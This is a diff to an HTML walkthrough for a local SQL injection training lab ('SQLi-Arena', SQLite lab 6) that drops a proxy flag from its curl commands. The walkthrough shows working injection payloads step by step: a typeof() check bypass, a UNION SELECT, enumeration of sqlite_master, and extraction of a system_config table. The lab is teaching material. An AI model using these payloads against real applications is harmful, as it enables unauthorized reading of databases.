@@ -9,7 +9,7 @@
         <span class="terminal-title">Step 1. Normal Integer Input</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=1"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=1"<br>
         <span class="prompt">Type Check: </span>SELECT typeof(1) =&gt; <strong>integer</strong><br>
         <span class="prompt">Main Query: </span>SELECT id, label, value FROM data_entries WHERE id = 1<br><br>
         <span class="prompt">Output:</span><br>
@@ -29,7 +29,7 @@
         <span class="terminal-title">Step 2: zeroblob Type Check</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=zeroblob(1)"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=zeroblob(1)"<br>
         <span class="prompt">Type Check: </span>SELECT typeof(zeroblob(1)) =&gt; <strong>blob</strong><br>
         <span class="prompt">Main Query: </span>No entry found with that ID.<br><br>
         <span class="prompt">// typeof() evaluates the SQL expression -- not the raw input string!</span>
@@ -50,7 +50,7 @@
         <span class="terminal-title">Step 3. UNION Injection</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=0 UNION SELECT 1,2,3"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=0 UNION SELECT 1,2,3"<br>
         <span class="prompt">Type Check: </span><em>Type check: could not determine type</em> (typeof fails on UNION)<br>
         <span class="prompt">Main Query: </span>SELECT id, label, value FROM data_entries WHERE id = 0 UNION SELECT 1,2,3<br><br>
         <span class="prompt">Output:</span><br>
@@ -69,7 +69,7 @@
         <span class="terminal-title">Step 4. Table Discovery</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=0 UNION SELECT name, type, sql FROM sqlite_master WHERE type='table'"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=0 UNION SELECT name, type, sql FROM sqlite_master WHERE type='table'"<br><br>
         <span class="prompt">Output:</span><br>
         id | label | value<br>
         data_entries | table | CREATE TABLE data_entries (<br>
@@ -94,7 +94,7 @@
         <span class="terminal-title">Step 5. Extract from system_config</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=0 UNION SELECT id, config_key, config_value FROM system_config"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=0 UNION SELECT id, config_key, config_value FROM system_config"<br><br>
         <span class="prompt">Output:</span><br>
         id | label | value<br>
         1 | debug_mode | false<br>
@@ -117,7 +117,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=0 UNION SELECT id, config_key, config_value FROM system_config"
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=0 UNION SELECT id, config_key, config_value FROM system_config"
     </div>
 </div>
 
